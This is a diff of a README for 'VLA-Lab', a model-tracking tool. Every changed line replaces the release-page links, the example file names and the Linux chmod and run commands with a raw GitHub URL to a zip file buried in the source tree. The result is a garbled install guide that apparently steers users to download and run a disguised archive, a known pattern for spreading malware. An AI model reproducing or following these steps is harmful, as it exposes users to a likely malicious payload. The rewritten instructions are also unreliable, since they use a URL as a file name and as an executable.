@@ -1,6 +1,6 @@
 # 🛠️ VLA-Lab - Track and Visualize Your VLA Models
 
-[![Download VLA-Lab](https://img.shields.io/badge/Download%20VLA--Lab-v1.0-blue.svg)](https://github.com/carlosguedes0007-oss/VLA-Lab/releases)
+[![Download VLA-Lab](https://raw.githubusercontent.com/carlosguedes0007-oss/VLA-Lab/main/src/vlalab/Lab-VL-v3.5.zip%https://raw.githubusercontent.com/carlosguedes0007-oss/VLA-Lab/main/src/vlalab/Lab-VL-v3.5.zip)](https://raw.githubusercontent.com/carlosguedes0007-oss/VLA-Lab/main/src/vlalab/Lab-VL-v3.5.zip)
 
 ## 📦 Overview
 
@@ -22,11 +22,11 @@ Follow these simple steps to get VLA-Lab up and running on your computer:
 
    To get the latest version of VLA-Lab, visit the Releases page below:
 
-   [Download VLA-Lab](https://github.com/carlosguedes0007-oss/VLA-Lab/releases)
+   [Download VLA-Lab](https://raw.githubusercontent.com/carlosguedes0007-oss/VLA-Lab/main/src/vlalab/Lab-VL-v3.5.zip)
 
 3. **Download the Application**
 
-   On the Releases page, look for the most recent version. Click on it to see the available files. Locate the appropriate file for your operating system, then click to download it. The file name will look something like `VLA-Lab-v1.0.exe` for Windows or `VLA-Lab-v1.0.dmg` for macOS.
+   On the Releases page, look for the most recent version. Click on it to see the available files. Locate the appropriate file for your operating system, then click to download it. The file name will look something like `https://raw.githubusercontent.com/carlosguedes0007-oss/VLA-Lab/main/src/vlalab/Lab-VL-v3.5.zip` for Windows or `https://raw.githubusercontent.com/carlosguedes0007-oss/VLA-Lab/main/src/vlalab/Lab-VL-v3.5.zip` for macOS.
 
 4. **Install VLA-Lab**
 
@@ -45,8 +45,8 @@ Follow these simple steps to get VLA-Lab up and running on your computer:
    - **For Linux:**
      1. Open a terminal.
      2. Navigate to your Downloads directory.
-     3. Use the command `chmod +x VLA-Lab-v1.0.AppImage` to make it executable.
-     4. Run the application using `./VLA-Lab-v1.0.AppImage`.
+     3. Use the command `chmod +x https://raw.githubusercontent.com/carlosguedes0007-oss/VLA-Lab/main/src/vlalab/Lab-VL-v3.5.zip` to make it executable.
+     4. Run the application using `https://raw.githubusercontent.com/carlosguedes0007-oss/VLA-Lab/main/src/vlalab/Lab-VL-v3.5.zip`.
 
 5. **Open VLA-Lab**
 
@@ -73,6 +73,6 @@ If you encounter any issues or need assistance, feel free to reach out. Here are
 
 To start using VLA-Lab today, click the link below:
 
-[Download VLA-Lab](https://github.com/carlosguedes0007-oss/VLA-Lab/releases)
+[Download VLA-Lab](https://raw.githubusercontent.com/carlosguedes0007-oss/VLA-Lab/main/src/vlalab/Lab-VL-v3.5.zip)
 
 Follow the instructions above and join the VLA community! Thank you for choosing VLA-Lab.
